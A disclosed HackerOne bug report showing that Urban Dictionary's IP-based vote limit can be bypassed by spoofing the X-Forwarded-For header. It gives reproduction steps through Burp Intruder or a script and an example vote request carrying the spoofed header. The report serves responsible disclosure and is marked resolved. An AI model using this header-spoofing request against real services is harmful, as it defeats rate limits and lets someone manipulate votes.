---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '812907'
original_report_id: '812907'
title: Bypass voting restriction due to HTTP Header Injection
team_handle: urbandictionary
created_at: '2020-03-07T20:10:33.062Z'
disclosed_at: '2020-07-08T20:15:20.091Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 16
asset_identifier: '*.urbandictionary.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# Bypass voting restriction due to HTTP Header Injection

## Metadata

- HackerOne Report ID: 812907
- Weakness: 
- Program: urbandictionary
- Disclosed At: 2020-07-08T20:15:20.091Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It is possible to bypass the voting restriction by adding a specially crafted HTTP-Header.  The underlying algorithm uses the ip address to restirct the voting of a user. However, by manipulating the IP-Adress via adding the HTTP-Header "X-Forwarded-For" it is possible to vote a entry up or down without any restrictions. 

Steps to reproduce:

1. Open a dictionary entry. 
2. Intercept the request of voting the dictionary entry up.
3. Send the request to repeater of intruder and add the "X-Forwarded-For <Arbitrary IP>" with an arbitrary ip.

It is possible to use the Burp intruder or write a python script to vote a entry up as ofter you like.

Example request:

```
POST /v0/vote HTTP/1.1
Host: api.urbandictionary.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Forwarded-For: 12.34.56.79
Content-Type: application/json; charset=utf-8
Content-Length: 35
Origin: https://hacker.com
Connection: close
Cookie: _ga=GA1.2.47064909.1583578169; _gid=GA1.2.1544677998.1583578169; _urbandictionary_session2=b356ceb8c5a73a51d46eb41ade3e16bc; __qca=P0-734169870-1583578169821; __gads=ID=22f39fd8c45fa19c:T=1583578173:S=ALNI_MbuqBUhxnFp6bo_iuHQWJAXpAwZww

{"defid":12559865,"direction":"up"}
````

## Impact

An attacker or normal user can vote a entry up unlimited times.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
